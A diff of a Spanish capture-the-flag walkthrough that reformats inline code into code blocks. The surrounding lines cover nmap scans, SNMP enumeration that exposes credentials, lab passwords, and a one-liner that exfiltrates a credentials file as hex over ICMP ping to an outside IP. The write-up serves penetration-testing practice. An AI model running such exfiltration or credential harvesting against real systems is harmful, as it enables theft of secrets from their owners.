@@ -51,7 +51,11 @@ nmap -sCV -p22,3366 10.10.10.92 -oN targeted
 
 ### Analysando el BaseHTTPServer {-}
 
-Con firefox entramos la url `http://10.10.10.92:3366`. Vemos un panel basic auth. Intentamos credenciales
+Con firefox entramos la url 
+```bash
+ http://10.10.10.92:3366 
+```
+. Vemos un panel basic auth. Intentamos credenciales
 por defecto
 
 ```bash
@@ -126,7 +130,11 @@ nmap -sCV -p22,80 -6 dead:beef:0250:56ff:feb9:5591 -oN targetedipv6
 
 ### Analysando la web en ipv6 {-}
 
-Con firefox se puede ver ipv6 poniendo la ip entre corchetes `[dead:beef:0250:56ff:feb9:5591]` y vemos un panel
+Con firefox se puede ver ipv6 poniendo la ip entre corchetes 
+```bash
+ [dead:beef:0250:56ff:feb9:5591] 
+```
+ y vemos un panel
 de authenticacion. Intentamos credenciales por defecto pero no encontramos nada.
 
 ### SNMPWALK mas contundente {-}
@@ -140,7 +148,11 @@ snmpwalk -v2c -c public 10.10.10.92 hrSWRunName | grep python
 snmpwalk -v2c -c public 10.10.10.92 hrSWRunTable | grep "568"
 ```
 
-Aqui vemos credenciales `loki:godofmischiefisloki`. Si nos connectamos con estas credenciales en el puerto 3366, podemos entrar
+Aqui vemos credenciales 
+```bash
+ loki:godofmischiefisloki 
+```
+. Si nos connectamos con estas credenciales en el puerto 3366, podemos entrar
 y vemos una tabla con otras credenciales. Vamos a la pagina del ipv6 y intentamos credenciales.
 
 ```bash
@@ -232,7 +244,11 @@ Como en la web vemos un mensaje que hay un fichero credentials en el directorio 
 xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.29; done
 ```
 
-y vemos un password `lokiisthebestnorsegod`.## Vuln exploit & Gaining Access {-}
+y vemos un password 
+```bash
+ lokiisthebestnorsegod 
+```
+.## Vuln exploit & Gaining Access {-}
 
 ### Ganando acceso con ssh {-}
 
@@ -302,7 +318,11 @@ ls -la /bin/su
 getfacl /bin/su
 ```
 
-Podemos ver con el comando `getfacl /bin/su` que hay un privilegio especial que hace que el usuario loki solo pueda leer el binario **su**
+Podemos ver con el comando 
+```bash
+ getfacl /bin/su 
+```
+ que hay un privilegio especial que hace que el usuario loki solo pueda leer el binario **su**
 pero sin poder ejecutarlo.
 
 Como tenemos acceso a la maquina tambien con www-data, podemos desde hay lanzar el comando **su**
